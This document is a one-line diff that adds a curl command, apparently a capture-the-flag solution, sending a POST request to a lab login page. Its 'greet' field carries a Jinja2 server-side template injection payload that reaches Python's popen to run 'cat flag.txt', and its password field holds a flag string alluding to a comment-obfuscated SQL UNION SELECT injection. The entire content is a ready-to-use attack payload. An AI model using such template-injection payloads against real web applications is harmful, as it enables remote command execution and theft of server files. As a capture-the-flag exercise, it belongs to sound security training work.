@@ -1,0 +1,1 @@
+curl https://login.ctf.zoolab.org/ --request POST -d 'username=admin&password=FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&greet={{[].__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]("cat flag.txt").read()}}'
